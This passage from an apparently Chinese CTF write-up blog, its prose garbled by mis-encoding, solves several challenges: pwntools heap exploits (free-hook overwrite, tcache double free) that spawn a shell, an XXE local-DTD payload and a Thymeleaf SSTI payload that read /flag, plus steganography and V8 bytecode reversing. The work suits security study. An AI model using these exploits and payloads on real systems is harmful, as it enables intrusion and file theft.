p.recvuntil(<span class="string">'Which chapter do you want to add into:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line">    sectionAddr = int(p.recvuntil(<span class="string">'\nSection name:'</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    <span class="keyword">return</span> sectionAddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddText</span><span class="params">(sectionName, size, text)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhich section do you want to add into:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    p.recvuntil(<span class="string">'\nHow many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'\nText:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelSection</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelText</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowBook</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(flag, oldName, newName)</span>:</span></span><br><span class="line">    choose(<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhat to update?(Chapter/Section/Text):'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.sendline(<span class="string">'Chapter'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Chapter name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="string">'Section'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Section name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">3</span>:</span><br><span class="line">        p.sendline(<span class="string">'Text'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Text:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">AddChapter(<span class="string">'cha1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec1'</span>)</span><br><span class="line">AddText(<span class="string">'sec1'</span>, <span class="number">0x10</span>, <span class="string">'text1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec2'</span>)</span><br><span class="line">AddText(<span class="string">'sec2'</span>, <span class="number">0x100</span>, <span class="string">'text2'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec3'</span>)</span><br><span class="line">sec4_addr = AddSection(<span class="string">'cha1'</span>, <span class="string">'sec4'</span>)</span><br><span class="line">text4_addr = sec4_addr + <span class="number">0x40</span></span><br><span class="line">AddText(<span class="string">'sec4'</span>, <span class="number">0x90</span>, <span class="string">'text4'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec5'</span>)</span><br><span class="line">AddText(<span class="string">'sec5'</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec4'</span>)</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(text4_addr) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">ShowBook()</span><br><span class="line">p.recvuntil(<span class="string">'Section:sec2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n      Text:'</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span> </span><br><span class="line">log.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">free_hook = libcbase + <span class="number">0x3C67A8</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(free_hook) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec2'</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec5'</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/PkQzGawD4UtrIFo.png" alt="book manager"></p><h3 id="Look-Around"><a href="#Look-Around" class="headerlink" title="Look Around"></a>Look Around</h3><p>é¢˜ç›®æè¿°ï¼šbuilded from tomcat:8-jre8</p><p>è¿›å…¥é¶æœºï¼Œf12ä¸€æ³¢ï¼Œå‘ç°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/_.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥ï¼š<a href="http://47.107.253.140:18080/webserver/js/_.js" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/js/_.js</a></p><p>å¾—åˆ°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var data = "<span class="meta">&lt;?xml version=\"1.0\" ?&gt;</span>\n<span class="tag">&lt;<span class="name">request</span>&gt;</span>\n    <span class="tag">&lt;<span class="name">status</span>&gt;</span>1<span class="tag">&lt;/<span class="name">status</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">request</span>&gt;</span>";</span><br><span class="line"></span><br><span class="line">setInterval(function()&#123;</span><br><span class="line">    $.post("callback", data);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯XXE</p><p>äºæ˜¯è¿›å…¥æ¥å£callback</p><p><img src="https://i.loli.net/2020/04/30/OrwX4yQTz7GoYA6.png" alt="Look Around"></p><p>è¦POSTï¼Œæ‰€ä»¥æŠ“åŒ…ï¼Œ</p><p>ç„¶åä¸ä¹…å‰å­¦XXEæ—¶çœ‹åˆ°è¿‡è¿™ç¯‡æ ¹æ®æœ¬åœ°DTDæ¥å®ç°XXEçš„æ–‡ç« </p><p><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p><p>äºæ˜¯æƒ³åœ¨è¿™é‡Œè¯•è¯•ã€‚</p><p>ä½†æ˜¯æœ¬åœ°æœ‰å•¥DTDæ–‡ä»¶å‘¢ï¼Ÿå‘ç°é¢˜ç›®ç»™äº†æç¤ºã€‚äºæ˜¯æ ¹æ®é¢˜ç›®æè¿°ï¼Œä¸‹è½½åŒåé•œåƒï¼Œ</p><p>ç»™ä¸ªdockerï¼Œç„¶åæ‰¾å…¶ä¸­çš„dtdæ–‡ä»¶ï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡ç« ä¸­æåˆ°çš„æ–‡ä»¶</p><p>/usr/share/xml/fontconfig/fonts.dtd</p><p>äºæ˜¯ç”¨æ–‡ç« é‡Œçš„payload ä¸€æŠŠæ¢­</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message [</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">usr</span>/<span class="attr">share</span>/<span class="attr">xml</span>/<span class="attr">fontconfig</span>/<span class="attr">fonts.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">expr</span> '<span class="attr">aaa</span>)&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">abcxyz</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">        &amp;#x25;eval;</span></span><br><span class="line"><span class="xml">        &amp;#x25;error;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">aa</span> (<span class="attr">bb</span>'&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">    %local_dtd;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/04/30/CYjDFbEnNcAzvhO.png" alt="Look Around"></p><p>flag{f1c6811d4dce2ae37613cee977febe305f4de8fe}</p><h3 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h3><p>é¢˜ç›®æè¿°ï¼šWrite something you want to see.</p><p>è¿›å…¥é¶æœºï¼Œf12ï¼Œå‘ç°ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="keyword">e</span><span class="variable">l:</span> <span class="string">'#app'</span>,</span><br><span class="line">    dat<span class="variable">a:</span> &#123;</span><br><span class="line">        conten<span class="variable">t:</span> <span class="string">''</span>,</span><br><span class="line">        resul<span class="variable">t:</span> <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    method<span class="variable">s:</span> &#123;</span><br><span class="line">        reques<span class="variable">t:</span> <span class="function"><span class="keyword">function</span><span class="params">(event)</span> &#123;</span></span><br><span class="line">            var <span class="keyword">vm</span> = this</span><br><span class="line">            axios.post(<span class="string">'/render'</span>, &#123;</span><br><span class="line">                conten<span class="variable">t:</span> <span class="keyword">vm</span>.content</span><br><span class="line">            &#125;)</span><br><span class="line">                .then(<span class="function"><span class="keyword">function</span> <span class="params">(response)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(response)</span><br><span class="line">                    <span class="keyword">vm</span>.result = response.data.result</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="keyword">catch</span>(<span class="function"><span class="keyword">function</span> <span class="params">(error)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(error)</span><br><span class="line">                    <span class="keyword">vm</span>.result = error</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å†æ ¹æ®é¢˜ç›®Renderï¼Œåº”è¯¥æ˜¯ä¸ªSSTIæ— ç–‘</p><p>å­¦ä¹ <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">æ–‡ç« </a></p><p>ä½†æ˜¯è¡¨ç¤ºè‡ªå·±å¤ªèœäº†ï¼Œç”šè‡³æ²¡çœ‹å‡ºæ¥è¿™ä¸ªç½‘é¡µçš„æ¡†æ¶</p><p>äºæ˜¯å…ˆå»åšäº†åˆ«çš„é¢˜ã€‚</p><p>ä¹‹åé˜Ÿå‹è¯´ï¼Œæ˜¯springbootï¼Œä»–è¯´è¿›å…¥<a href="http://47.107.244.251:18080/renderå›æ˜¾çš„æ˜¯" target="_blank" rel="noopener">http://47.107.244.251:18080/renderå›æ˜¾çš„æ˜¯</a></p><p><img src="https://i.loli.net/2020/04/30/hgyOsAmMtkcIlWo.png" alt="Render">é‚æŠ“åŒ…ï¼Œå¾—åˆ°</p><p><img src="https://i.loli.net/2020/04/30/nLXKC8eZxu9afbw.png" alt="Render"></p><p>å› ä¸ºSpring Boot å®˜æ–¹æ¨èä½¿ç”¨ â€œThymeleafâ€æ¨¡æ¿å¼•æ“</p><p>äºæ˜¯è¯•è¯•æ˜¯å¦æœ‰Thymeleaf æ¸²æŸ“</p><p><img src="https://i.loli.net/2020/04/30/xb6QnRTlcOXhFqG.png" alt="Render"></p><p>å‘ç°å¤±è´¥ï¼ŒæŠŠæ€è·¯ä¸¢ç»™é˜Ÿå‹ï¼Œè®©ä»–å†å»è¯•è¯•ã€‚</p><p>æœ€åå¾ˆå°´å°¬ï¼Œé˜Ÿå‹è¯´ï¼Œæˆ‘ç¬¦å·ç”¨é”™äº†ï¼Œè¯¥ç”¨å¤§æ‹¬å·ï¼Œï¼ˆå•Šï¼Œä½çº§é”™è¯¯ï¼Œ233333ï¼‰</p><p><img src="https://i.loli.net/2020/04/30/Ug9QuyRI2vSjYfr.png" alt="Render"></p><p>å›æ˜¾æˆåŠŸï¼Œäºæ˜¯javaè¯»æ–‡ä»¶ä¸€æŠŠæ¢­</p><p>payload</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="type"></span>"[[$&#123;<span class="keyword">new</span> <span class="type">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="type">java</span>.io.FileReader(\<span class="string">"/flag\")).readLine()&#125;]]"</span>&#125;</span><br></pre></td></tr></table></figure><p>å‘åŒ…å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/04/30/WRrA9LvksInEeTf.png" alt="image-20200430233603887"></p><p>flag{nBz9mertYP@pyyZxx9@nn}</p><h3 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h3><p>é¢˜ç›®æè¿°ï¼šHidden in the history</p><p>ä¸‹è½½å¾—åˆ°å›¾ç‰‡</p><p>æ”¾è¿›Stegsolve.jarï¼Œè°ƒæ•´é€šé“å‘ç°ç«¯å€ª</p><p><img src="https://i.loli.net/2020/04/30/tNLGsorfkJ6TU45.png" alt="2019"></p><p>LSBéšå†™ï¼Œ</p><p>ç„¶åæ”¾è¿›zstegï¼Œå¯¼å‡ºå¾—åˆ°å­—ç¬¦ä¸²</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="attribute">QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA</span>==</span><br></pre></td></tr></table></figure><p>å»æ‰æ‹¬å·base64å¾—åˆ°:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ao</span>(mgH[]<span class="symbol">WO</span>,r8US3GM2R2I<span class="comment">%YB7st</span></span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸å‡ºç‰¹å¾ï¼Œäºæ˜¯å…ˆbaseå…¨å®¶æ¡¶è¯•äº†ä¸€æ³¢ï¼Œå‘ç°æ˜¯base85</p><p>è§£å¾—ï¼šflag{~h!%3W-9jKB6(fG}</p><h3 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h3><p>é¢˜ç›®æè¿°ï¼štip:é¢˜ç›®ç¯å¢ƒä¸ºUbuntu18.04ï¼Œflagè·¯å¾„/home/flag</p><p>è¿™ä¸ªé¢˜å¯ä»¥åˆ©ç”¨å †ä¸Šçš„ç›¸å¯¹åç§»ç„¶åé€šè¿‡deleteæ¥double freeï¼Œä¸”2.27ç‰ˆæœ¬libcå› ä¸ºæœ‰tacaheæœºåˆ¶ï¼Œæ‰€ä»¥doublefreeçš„åˆ©ç”¨å˜å¾—éå¸¸ç®€å•ï¼Œå…ˆå¡«æ»¡7ä¸ªchunkï¼Œå†freeä¸€ä¸ªåˆ°unsortedbiné‡Œé¢å»ï¼Œåˆ©ç”¨é‡Œé¢main_areançš„åœ°å€æ”¹å†™åé¢2ä¸ªå­—èŠ‚ï¼Œçˆ†ç ´ä¸€ä¸‹å¯ä»¥å¾—åˆ°free_hookä¸­çš„chunkï¼Œé€šè¿‡æ”¹å†™free_hookä¸ºputsçš„pltè¡¨ï¼Œç„¶åé€šè¿‡deleteå‡½æ•°æ‰¾åˆ°å¯¹åº”å¯ä»¥æ³„éœ²libcçš„åœ°å€çš„åç§»ï¼Œç„¶åå°±å¯ä»¥æ‰“å°å‡ºlibcçš„åœ°å€ï¼Œå†æ”¹å†™free_hookä¸ºsystemå‡½æ•°åœ°å€ï¼Œå†é€šè¿‡libcä¸Š/bin/shå­—ç¬¦ä¸²çš„åç§»ï¼ŒæˆåŠŸæ‰§è¡Œsystem(â€œ/bin/shâ€)ï¼Œgetshellã€‚è„šæœ¬å¦‚ä¸‹</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./hub')</span></span><br><span class="line">p = remote(<span class="string">'47.112.139.218'</span>, <span class="number">13132</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hub'</span>)</span><br><span class="line"></span><br><span class="line">def choose(choice):</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(str(choice) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'How long will you stay?\n'</span>)</span><br><span class="line">    p.sendline(str(size) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which hub don\'t you want?\n'</span>)</span><br><span class="line">    p.sendline(str(index) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do you want?\n'</span>)</span><br><span class="line">    p.<span class="built_in">send</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="string">'\xe8\x68'</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line">edit(p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x1ee0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3eba83</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"libcbase:%#x"</span> %libcbase)</span><br><span class="line">system_addr = libcbase + <span class="number">0x4f440</span></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x239a4e</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/ZfXlDQmhzRCW4vF.png" alt="Hub"></p><h3 id="8v"><a href="#8v" class="headerlink" title="8v"></a>8v</h3><p>é¢˜ç›®æè¿°ï¼šI run the js code and get flag</p><p>å¾—åˆ°ä¸€ä»½æ–‡æ¡£ï¼Œå…¨æ˜¯å­—èŠ‚ç ï¼Œé‚å¼€å§‹ä¸€è¡Œä¸€è¡Œâ€œç¿»è¯‘â€</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc</a></p><p><a href="https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h</a></p><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></p><p><a href="https://github.com/danbev/learning-v8" target="_blank" rel="noopener">https://github.com/danbev/learning-v8</a></p><p>çœ‹æ‡‚å®ŒæŒ‡ä»¤å¹¶ä¸æ˜¯å¾ˆéš¾ï¼Œæ ¸å¿ƒå°±æ˜¯ä¸€ä¸ªç®€å•çš„ä¸‰é¡¹æ•°å¼‚æˆ–åŠ å¯†ï¼Œ</p><p>ç„¶åå­˜åœ¨ä¸¤ä¸ªç±»ä¼¼äºæ–æ³¢é‚£å¥‘æ•°åˆ—çš„å‰åç›¸å…³çš„æ•°åˆ—ï¼Œ</p><p>æ•°åˆ—aèµ·å§‹ä½æ˜¯$a_1=88$</p><p>å‡½æ•°æ˜¯ï¼š$a_n=(a_{n-1}*65+66)$%$256$</p><p>å¾—åˆ°æ•°åˆ—ï¼š$a = [88, 154, 92, 158, 96, 162, 100, 166, 104, 170, 108, 174, 112, 178, 116, 182, 120, 186, 124, 190, 128, 194, 132, 198, 136, 202, 140, 206, 144, 210,]$</p><p>æ•°åˆ—bèµ·å§‹ä½æ˜¯$b_1=148$</p><p>å‡½æ•°æ˜¯ï¼š$b_n=(b_{n-1}*35-16)$%$256$</p><p>æœ€åç¨‹åºè¿˜æœ‰ä¸ªå°†æ•°åˆ—bé€†åºçš„æ“ä½œ</p><p>å¾—åˆ°æ•°åˆ—ï¼š$b=[236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148, 12, 52, 236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148]$</p><p>å†åŠ ä¸Š</p><p>enc=bâ€™\xd2â€\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;â€™</p><p>æœ€åä¸‰ä¸ªæ•°åˆ—é€ä½å¼‚æˆ–ï¼Œå¾—åˆ°</p><p>flag{V8_ByteCode_is_Very_Easy}</p><h3 id="PyBox"><a href="#PyBox" class="headerlink" title="PyBox"></a>PyBox</h3><p>é¢˜ç›®æè¿°ï¼šcut flag sleep repeat</p><p>è¿ä¸Šæ²™ç®±</p><p><img src="https://i.loli.net/2020/04/30/vdUtPfwu4DlzCy3.png" alt="PyBox"></p><p>çœ‹ç€åƒpythonï¼Œä½†æ˜¯è¿™ä¸ªpythonä¸ºå•¥æ²¡æœ‰ä¸€ç‚¹ç‚¹åŠŸèƒ½ï¼Ÿå•¥ä¹Ÿä¸èƒ½å¹²ï¼Ÿä¹Ÿæ²¡æœ‰å›æ˜¾ã€‚</p><p>ä¸è¿‡æ²¡æœ‰å›æ˜¾å€’å¯ä»¥åˆ©ç”¨sqlçš„æ—¶é—´ç›²æ³¨çš„æ–¹æ³•ï¼Œä½†æ˜¯æœ‰å•¥åŠŸèƒ½èƒ½åˆ©ç”¨å‘¢ï¼Ÿ</p><p>äºæ˜¯å»å­¦ä¹ æ²™ç®±é€ƒé€¸ä¸€æ³¢</p><p><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p><p><img src="https://i.loli.net/2020/04/30/MuHaAbo7zpVqLXe.png" alt="PyBox"></p><p>å‘ç°äº†è¿™ä¸ªï¼Œ</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span 